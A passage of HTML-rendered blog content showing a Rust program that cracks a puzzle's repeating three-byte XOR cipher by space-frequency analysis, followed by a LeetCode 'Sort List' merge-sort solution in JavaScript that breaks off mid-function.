class="number">31</span>,<span class="number">16</span>,<span class="number">22</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">17</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">69</span>,<span class="number">8</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">12</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="number">17</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">69</span>,<span class="number">23</span>,<span class="number">22</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">19</span>,<span class="number">9</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">31</span>,<span class="number">22</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">67</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">80</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">30</span>,<span class="number">2</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">69</span>,<span class="number">23</span>,<span class="number">22</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">29</span>,<span class="number">1</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">28</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">31</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">92</span>,<span class="number">69</span>,<span class="number">17</span>,<span class="number">4</span>,<span class="number">69</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">80</span>,<span class="number">70</span>,<span class="number">76</span>,<span class="number">88</span>,<span class="number">29</span>,<span class="number">16</span>,<span class="number">20</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">28</span>,<span class="number">12</span>,<span class="number">29</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">26</span>,<span class="number">9</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="number">17</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">31</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">86</span>,<span class="number">80</span>,<span class="number">44</span>,<span class="number">88</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">20</span>,<span class="number">28</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">31</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">16</span>,<span class="number">31</span>,<span class="number">18</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">25</span>,<span class="number">4</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">7</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">29</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">75</span>,<span class="number">78</span>,<span class="number">68</span>,<span class="number">81</span>,<span class="number">65</span>,<span class="number">67</span>,<span class="number">81</span>,<span class="number">72</span>,<span class="number">70</span>,<span class="number">83</span>,<span class="number">64</span>,<span class="number">68</span>,<span class="number">87</span>,<span class="number">74</span>,<span class="number">70</span>,<span class="number">81</span>,<span class="number">75</span>,<span class="number">70</span>,<span class="number">81</span>,<span class="number">67</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">22</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">30</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">80</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">28</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">25</span>,<span class="number">11</span>,<span class="number">31</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">30</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">18</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">73</span>,<span class="number">88</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">19</span>,<span class="number">25</span>,<span class="number">11</span>,<span class="number">31</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">73</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">7</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">69</span>,<span class="number">75</span>,<span class="number">94</span>,<span class="number">84</span>,<span class="number">76</span>,<span class="number">65</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">66</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">67</span>,<span class="number">80</span>,<span class="number">64</span>,<span class="number">73</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">67</span>,<span class="number">87</span>,<span class="number">75</span>,<span class="number">72</span>,<span class="number">69</span>,<span class="number">17</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">17</span>,<span class="number">30</span>,<span class="number">1</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">1</span>,<span class="number">88</span>,<span class="number">0</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">20</span>,<span class="number">16</span>,<span class="number">27</span>,<span class="number">21</span>,<span class="number">1</span>,<span class="number">84</span>,<span class="number">80</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">6</span>,<span class="number">16</span>,<span class="number">80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">22</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">25</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">88</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">19</span>,<span class="number">9</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">31</span>,<span class="number">22</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">86</span>,<span class="number">80</span>,<span class="number">35</span>,<span class="number">23</span>,<span class="number">28</span>,<span class="number">9</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">69</span>,<span class="number">25</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">17</span>,<span class="number">30</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">26</span>,<span class="number">9</span>,<span class="number">69</span>,<span class="number">15</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">27</span>,<span class="number">24</span>,<span class="number">69</span>,<span class="number">49</span>,<span class="number">80</span>,<span class="number">13</span>,<span class="number">25</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">23</span>,<span class="number">17</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">28</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">92</span>,<span class="number">69</span>,<span class="number">49</span>,<span class="number">80</span>,<span class="number">13</span>,<span class="number">25</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">19</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">78</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">74</span>,<span class="number">73</span>,<span class="number">70</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">84</span>,<span class="number">88</span>,<span class="number">91</span>,<span class="number">69</span>,<span class="number">73</span>,<span class="number">95</span>,<span class="number">87</span>,<span class="number">77</span>,<span class="number">70</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">87</span>,<span class="number">70</span>,<span class="number">87</span>,<span class="number">77</span>,<span class="number">80</span>,<span class="number">78</span>,<span class="number">88</span>,<span class="number">21</span>,<span class="number">17</span>,<span class="number">27</span>,<span class="number">94</span>,<span class="number">69</span>,<span class="number">25</span>,<span class="number">28</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">1</span>,<span class="number">29</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">11</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">6</span>,<span class="number">17</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">75</span>,<span class="number">88</span>,<span class="number">62</span>,<span class="number">4</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">92</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">25</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">29</span>,<span class="number">16</span>,<span class="number">20</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">28</span>,<span class="number">12</span>,<span class="number">29</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">26</span>,<span class="number">9</span>,<span class="number">69</span>,<span class="number">65</span>,<span class="number">64</span>,<span class="number">69</span>,<span class="number">31</span>,<span class="number">25</span>,<span class="number">19</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">18</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">28</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">80</span>,<span class="number">22</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">80</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">89</span>,<span class="number">69</span>,<span class="number">23</span>,<span class="number">22</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">19</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">23</span>,<span class="number">22</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">25</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="number">88</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">19</span>,<span class="number">9</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">31</span>,<span class="number">22</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">80</span>,<span class="number">84</span>,<span class="number">86</span>,<span class="number">80</span>,<span class="number">36</span>,<span class="number">22</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">26</span>,<span class="number">9</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">25</span>,<span class="number">8</span>,<span class="number">17</span>,<span class="number">28</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">30</span>,<span class="number">12</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">69</span>,<span class="number">49</span>,<span class="number">80</span>,<span class="number">13</span>,<span class="number">25</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">28</span>,<span class="number">12</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">18</span>,<span class="number">17</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">18</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">69</span>,<span class="number">25</span>,<span class="number">18</span>,<span class="number">9</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">1</span>,<span class="number">29</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">22</span>,<span class="number">21</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">23</span>,<span class="number">22</span>,<span class="number">69</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">26</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">69</span>,<span class="number">11</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">88</span>,<span class="number">25</span>,<span class="number">11</span>,<span class="number">88</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">88</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">22</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">69</span>,<span class="number">25</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">88</span>,<span class="number">21</span>,<span class="number">19</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">69</span>,<span class="number">22</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">26</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">11</span>,<span class="number">94</span>];</span><br><span class="line">    <span class="keyword">let</span> key:[<span class="built_in">u8</span>; <span class="number">3</span>] = [key(&amp;cipher, <span class="number">0</span>, <span class="number">3</span>), key(&amp;cipher, <span class="number">1</span>, <span class="number">3</span>), key(&amp;cipher, <span class="number">2</span>, <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">let</span> plain_text = otp_decrypt(&amp;cipher, &amp;key);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Plain text is \n```\n&#123;&#125;\n```"</span>, plain_text);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plain_text.chars() &#123;</span><br><span class="line">        ans += i <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">key</span></span>(cipher: &amp;[<span class="built_in">u8</span>], index: <span class="built_in">usize</span>, length: <span class="built_in">usize</span>) -&gt; <span class="built_in">u8</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> max_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">97u8</span>..<span class="number">123</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> (index..cipher.len()).step_by(length) &#123;</span><br><span class="line">            <span class="keyword">if</span> cipher[j] ^ i == <span class="number">32</span> &#123;</span><br><span class="line">                cnt += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> cnt &gt; max_cnt &#123;</span><br><span class="line">            max_cnt = cnt;</span><br><span class="line">            ans = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">otp_decrypt</span></span>(cipher: &amp;[<span class="built_in">u8</span>], key: &amp;[<span class="built_in">u8</span>]) -&gt; <span class="built_in">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">String</span> = <span class="built_in">String</span>::new();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..cipher.len() &#123;</span><br><span class="line">        ans.push((cipher[i]^key[i%key.len()]) <span class="keyword">as</span> <span class="built_in">char</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="148-Sort-List"><a href="#148-Sort-List" class="headerlink" title="148. Sort List"></a>148. Sort List</h3><p>Sort a linked list in <em>O</em>(<em>n</em> log <em>n</em>) time using constant space complexity.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4-&gt;2-&gt;1-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -1-&gt;5-&gt;3-&gt;4-&gt;0</span><br><span class="line">Output: -1-&gt;0-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>simple mergesort.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * function ListNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.next = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"> * @return &#123;ListNode&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> sortList = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">  <span class="keyword">let</span> prev = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> mid = head;</span><br><span class="line">  <span class="keyword">let</span> end = head;</span><br><span class="line">  <span class="keyword">while</span> (end !== <span class="literal">null</span> &amp;&amp; end.next !== <span class="literal">null</span>) &#123;</span><br><span class="line">    prev = mid;</span><br><span class="line">    mid = mid.next;</span><br><span class="line">    end = end.next.next;</span><br><span class="line">  &#125;</span><br><span class="line">  prev.next = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span>  merge = <span class="function">(<span class="params">head1, head2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp_head = <span class="keyword">new</span> ListNode;</span><br><span class="line">    <span class="keyword">let</span> cur = tmp_head;</span><br><span class="line">    <span class="keyword">while</span> (head1 !== <span class="literal">null</span> &amp;&amp; head2 !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (head1.val &lt; head2.val) &#123;</span><br><span class="line">        cur.next = head1;</span><br><span class="line">        head1 = head1.next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cur.next = head2;</span><br><span class="line">        head2 = head2.next;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (head1 !== <span class="literal">null</span>) &#123;</span><br><span class="line">      cur.next = head1;</span><br><span class="line">      head1 = head1.next;</span><br><span class="line">      cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 